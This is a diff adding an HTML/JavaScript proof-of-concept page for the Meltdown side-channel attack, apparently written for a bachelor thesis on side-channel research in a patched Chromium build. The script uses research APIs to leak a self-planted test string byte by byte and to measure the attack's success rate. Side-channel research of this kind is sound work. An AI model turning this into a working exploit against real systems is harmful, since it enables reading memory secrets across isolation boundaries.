@@ -1,0 +1,196 @@
+ <!--
+Author: Jonathan Busch (jonathan.busch@pm.me)
+This document is a Proof-of-Concept of the Meltdown attack by Lipp et al. 
+and is part of the Bachelor Thesis "Power-ups for Chromium: Facilitate Side-Channel Research".
+This code only works on Linux on the Chromium version with the following patch: TODO
+ -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Meltdown JS PoC</title>
+    <meta http-equiv='cache-control' content='no-cache'>
+    <meta http-equiv='expires' content='0'>
+    <meta http-equiv='pragma' content='no-cache'>
+</head>
+
+
+<body>
+
+<h1>Meltdown JS PoC</h1>
+
+<div class="btn-group">
+    <button type="button" id="btn_start_JS" onclick="startAttackJS()">Start attack using libkdump API</button>
+    <button type="button" id="btn_start" onclick="startAttack()">Start full attack</button>
+</div>
+<br><br>
+
+<p id="expected">Expected: </p>
+<p id="leak">Leak: </p>
+<p id="info">Info: </p>
+
+<script>
+    var p_expected = document.getElementById("expected");
+    var p_leak = document.getElementById("leak");
+    var p_info = document.getElementById("info");
+    var i_input = document.getElementById("input");
+
+    const EXPECTED_DEFAULT = "Leak me!"; // Default value
+    let EXPECTED = "";
+    let LEAKED = "";
+    let EVALUATION = false;
+
+    var text_encoder = new TextEncoder(); // always utf-8
+
+
+    // Check for OS. Only supported on Linux
+    if (!/Linux/.test(window.navigator.platform)) {
+        printInfo("This PoC is only supported on Linux systems!\n\nIf you are on Linux and you still get this message, run the function \"disableOSCheck()\" in the console.");
+        document.getElementById("btn_start").disabled = true;
+        document.getElementById("btn_start_JS").disabled = true;
+    }
+
+    /********************************************************************
+    Attacks
+    ********************************************************************/
+    function startAttackJS() {
+        resetTextFields();
+        if (!EXPECTED) {
+            EXPECTED = EXPECTED_DEFAULT;
+        }
+        let secret = new Uint8Array(4096);
+        text_encoder.encodeInto(EXPECTED, secret);
+        if (!EVALUATION) {
+            meltdown.initAutoconfig();
+        }
+        LEAKED = "";
+        let addr = sca.bufferAddress(secret.buffer);
+        for (var i = 0; i < EXPECTED.length; i++) {
+            LEAKED += String.fromCharCode(meltdown.read(addr + i));
+        }
+        if (!EVALUATION) {
+            meltdown.cleanup();
+        }
+
+        let res_info = EXPECTED === LEAKED ? "Success!" : "Failed!";
+        printInfo("Configuration: " + meltdown.configToString() + "\n\n" + res_info);
+        printExpected();
+        printLeak();
+        return EXPECTED === LEAKED;
+    }
+
+    function startAttack() {
+        resetTextFields();
+        var res_info = sca.meltdown();
+        printInfo(res_info);
+    }
+
+    /********************************************************************
+    Utils
+    ********************************************************************/
+    function resetTextFields() {
+        if (!EVALUATION) {
+            p_expected.innerText = "Expected:\u00A0";
+            p_leak.innerText = "Leak:\u00A0";
+            p_info.innerText = "Info:\u00A0";
+        }
+    }
+
+    function printInfo(text) {
+        if (!EVALUATION) {
+            p_info.innerText = "Info: " + text;
+            console.log("[INFO] " + text);
+        }
+    }
+
+    function printExpected() {
+        if (!EVALUATION) {
+            p_expected.innerText = "Expected: " + EXPECTED;
+            console.log("[EXPECTED] " + EXPECTED);
+        }
+    }
+
+    function printLeak() {
+        if (!EVALUATION) {
+            p_leak.innerText = "Leak:\u00A0" + LEAKED;
+            console.log("[LEAKED] " + LEAKED);
+        }
+    }
+
+    function log(text) {
+        if (!EVALUATION) {
+            console.log(text);
+        }
+    }
+
+    function disableOSCheck() {
+        document.getElementById("btn_start").disabled = false;
+        document.getElementById("btn_start_JS").disabled = false;
+        resetTextFields();
+    }
+
+    /********************************************************************
+    Evaluation
+    ********************************************************************/
+    function getRandomLetter() {
+        cc = Math.random() * 95 + 32;
+        return String.fromCharCode(cc);
+    }
+
+    function evaluate(iterations, length, dl = false) {
+        resetTextFields();
+        if (length > 4096) {
+            printInfo("The maximum length is 4096.");
+            return;
+        }
+        printInfo("Evaluating...");
+        EVALUATION = true;
+        res = [];
+        succ = 0;
+        meltdown.initAutoconfig();
+        for (let i = 0; i < iterations; i++) {
+            let exp = "";
+            for (var j = 0; j < length; j++) {
+                exp += getRandomLetter();
+            }
+            EXPECTED = exp;
+            let dummy = startAttackJS();
+            let eq = 0;
+            for (var j = 0; j < length; j++) {
+                if (EXPECTED[j] === LEAKED[j]) {
+                    eq++;
+                }
+            }
+            res.push(eq/length);
+            if (eq == length) {
+                succ++;
+            }
+        }
+        meltdown.cleanup();
+        EXPECTED = EXPECTED_DEFAULT;
+        if (dl) {
+            download(res, iterations + "x_" + length + "l");
+        }
+        succ_rate = (100 * succ) / iterations;
+        EVALUATION = false;
+        printInfo("Success rate: " + succ_rate + "%");
+    }
+
+    function download(data, name) {
+        let csv = "data:text/csv;charset=utf-8,";
+        csv += "x\r\n";
+        data.forEach(function(e) {
+            csv += e + "\r\n";
+        });
+
+        var dl = encodeURI(csv);
+        var link = document.createElement("a");
+        link.setAttribute("href", dl);
+        link.setAttribute("download", name + ".csv");
+        document.body.appendChild(link);
+
+        link.click();
+    }
+
+
+
+</script>
